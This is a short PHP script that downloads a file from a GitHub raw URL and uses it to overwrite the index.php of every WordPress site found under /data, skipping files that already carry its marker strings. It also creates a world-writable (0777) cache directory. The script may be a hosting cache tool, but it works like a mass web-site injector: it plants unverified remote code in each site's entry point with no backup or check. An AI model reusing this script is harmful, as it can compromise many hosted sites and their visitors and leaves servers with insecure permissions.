<?php 

    define('CACHEDIR', '/dev/shm/cache/');

    $Content2Replace = file_get_contents('https://raw.githubusercontent.com/d2scripts/others/refs/heads/main/wp-cached-index.php');

    if(
        strpos($Content2Replace, 'DATA2_FLG_CACHE') === false
        || strpos($Content2Replace, 'data2-cache-id') === false
        || strpos($Content2Replace, 'data2-cache-id-content') === false
    )
    exit('ERROR IN CONTENT TO REPLACE');

    #echo $Content2Replace; exit;

    if(!is_dir(CACHEDIR))
    {
        mkdir(CACHEDIR, 0777, true);
    }

    chmod(CACHEDIR, 0777);

    $ALL_FILES = array_merge(
        glob('/data/*/index.php'),
        glob('/data/*/public_html/index.php'),
        glob('/data/*/htdocs/index.php'),
        glob('/data/*/www/index.php'),
    );

    foreach($ALL_FILES as $FILE)
    {
        if(is_file($FILE))
        {
            $Conteudo = file_get_contents($FILE);
            $Size = strlen($Conteudo);

            if(
                strpos($Conteudo, 'WP_USE_THEMES') !== false
                && strpos($Conteudo, '/wp-blog-header.php') !== false
                && strpos($Conteudo, 'DATA2_FLG_CACHE') === false
                && strpos($Conteudo, 'data2-cache-id') === false
                )
                {
                    file_put_contents($FILE, $Content2Replace);                    
                    echo "TROCAR: " . $FILE . "\t" . $Size . PHP_EOL;
                    #sleep(1);
                    usleep(25412);
                }

            #if($Size != 405)
           #{
               # echo $FILE . "\t" . strlen($Conteudo) . PHP_EOL;
            #}
            
        }        
    }

